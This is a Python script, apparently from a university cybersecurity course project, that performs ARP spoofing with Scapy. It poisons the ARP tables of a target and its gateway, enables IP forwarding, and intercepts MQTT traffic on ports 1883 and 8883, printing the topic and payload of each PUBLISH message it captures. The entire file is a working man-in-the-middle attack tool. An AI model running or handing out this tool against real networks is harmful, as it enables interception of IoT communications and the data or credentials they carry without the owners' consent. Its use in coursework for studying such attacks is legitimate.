"""
Univerità degli studi di Bologna
Project for the Cybersecurity course
Academic year 2024/2025

Script for performing ARP spoofing and sniffing MQTT traffic on a network.  
Uses Scapy to manipulate ARP tables and intercept MQTT messages over TCP ports 1883 and 8883.  

Usage: python mitm.py -g <gateway_ip> -t <target_ip> -i <interface>
- gateway_ip: IP address of the network gateway
- target_ip: IP address of the target device
- interface: Network interface to use for the attack

Authors:
- Emanuele Grasso   (0001141478)
- Simone Rinaldi    (0001140193)
"""

#!/usr/bin/env python3

import argparse
import time
import signal
import sys
from scapy.all import *
from scapy.layers.inet import TCP
from scapy.config import conf
from threading import Thread
import struct

def get_args():
    """
    Parse command-line arguments.
    
    Returns:
        argparse.Namespace: Parsed command-line arguments containing gateway IP, target IP, and network interface.
    """
    parser = argparse.ArgumentParser()
    parser.add_argument("-g", "--gateway", required=True, help="Gateway IP address")
    parser.add_argument("-t", "--target", required=True, help="Target IP address")
    parser.add_argument("-i", "--interface", required=True, help="Network interface")
    return parser.parse_args()

def enable_ip_forwarding():
    """Enable IP forwarding to allow packet forwarding through the system."""
    with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
        f.write("1\n")

def disable_ip_forwarding():
    """Disable IP forwarding to restore default network settings."""
    with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
        f.write("0\n")

def get_mac(ip):
    """
    Retrieve the MAC address of a given IP using ARP requests.
    
    Args:
        ip (str): IP address to resolve.
    
    Returns:
        str: MAC address if found, otherwise None.
    """
    ans = Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip)
    result = srp(ans, timeout=2, verbose=False, iface=args.interface)[0]
    return result[0][1].hwsrc if result else None

def spoof(target_ip, gateway_ip):
    """
    Perform an ARP spoofing attack by sending malicious ARP responses.
    
    Args:
        target_ip (str): Target IP address.
        gateway_ip (str): Gateway IP address.
    """
    target_mac = get_mac(target_ip)
    attacker_mac = get_if_hwaddr(args.interface)
    arp_response = Ether(dst=target_mac, src=attacker_mac)/ARP(
        pdst=target_ip,
        hwdst=target_mac,
        psrc=gateway_ip,
        hwsrc=attacker_mac,
        op=2
    )
    sendp(arp_response, verbose=False, iface=args.interface)

def restore(target_ip, gateway_ip):
    """
    Restore the ARP tables by sending legitimate ARP responses.
    
    Args:
        target_ip (str): Target IP address.
        gateway_ip (str): Gateway IP address.
    """
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)
    attacker_mac = get_if_hwaddr(args.interface)
    arp_response = Ether(dst=target_mac, src=attacker_mac)/ARP(
        pdst=target_ip,
        hwdst=target_mac,
        psrc=gateway_ip,
        hwsrc=gateway_mac,
        op=2
    )
    sendp(arp_response, count=5, verbose=False, iface=args.interface)

def parse_mqtt_publish(payload):
    """
    Parse an MQTT PUBLISH packet to extract the topic and message.
    
    Args:
        payload (bytes): Raw MQTT packet payload.
    
    Returns:
        tuple: (topic, message, packet_id) if parsing succeeds, otherwise (None, None, None).
    """
    try:
        idx = 0
        topic_length = struct.unpack('!H', payload[idx:idx+2])[0]
        idx += 2
        topic = payload[idx:idx+topic_length].decode('utf-8')
        idx += topic_length
        
        packet_id = None
        if len(payload) > idx + 2:
            packet_id = struct.unpack('!H', payload[idx:idx+2])[0]
            idx += 2
        
        message = payload[idx:]
        
        return topic, message, packet_id
    except Exception as e:
        print(f"Error parsing MQTT PUBLISH: {e}")
        return None, None, None

def process_mqtt(packet):
    """
    Process MQTT packets and extract relevant data.
    
    Args:
        packet (scapy.packet.Packet): Captured network packet.
    """
    if packet.haslayer(TCP) and (packet[TCP].dport == 1883 or packet[TCP].sport == 1883):
        try:
            payload = bytes(packet[TCP].payload)
            if not payload:
                return
            
            control_packet_type = (payload[0] & 0xF0) >> 4
            
            if control_packet_type == 3:  # MQTT PUBLISH
                topic, message, packet_id = parse_mqtt_publish(payload[2:])
                if topic:
                    print("\n[+] MQTT PUBLISH Message Detected")
                    print("=" * 50)
                    print(f"Source IP: {packet[IP].src}")
                    print(f"Destination IP: {packet[IP].dst}")
                    print(f"Topic: {topic}")
                    if packet_id:
                        print(f"Packet ID: {packet_id}")
                    
                    print("\nPayload (Hex):")
                    print(message.hex())
                    
                    print("\nPayload (String):")
                    try:
                        print(message.decode('utf-8', errors='replace'))
                    except:
                        print("(Binary data)")
                    
                    print("=" * 50)
        except Exception as e:
            print(f"Error processing MQTT packet: {e}")

def sniff_mqtt(interface):
    """
    Start sniffing MQTT traffic on the specified interface.
    
    Args:
        interface (str): Network interface to sniff packets on.
    """
    filter_str = "tcp port 1883 or tcp port 8883"
    sniff(filter=filter_str, iface=interface, prn=process_mqtt, store=0)

def signal_handler(sig, frame):
    """Handle termination signal and restore ARP tables."""
    print("\nRestoring ARP tables...")
    restore(args.target, args.gateway)
    restore(args.gateway, args.target)
    disable_ip_forwarding()
    sys.exit(0)

if __name__ == "__main__":
    args = get_args()
    conf.iface = args.interface
    
    print("[*] Enabling IP forwarding")
    enable_ip_forwarding()
    
    print("[*] Starting ARP spoofing attack (Ctrl+C to stop)")
    signal.signal(signal.SIGINT, signal_handler)
    
    sniffer = Thread(target=sniff_mqtt, args=(args.interface,))
    sniffer.daemon = True
    sniffer.start()
    
    try:
        while True:
            spoof(args.target, args.gateway)
            spoof(args.gateway, args.target)
            time.sleep(2)
    except KeyboardInterrupt:
        pass
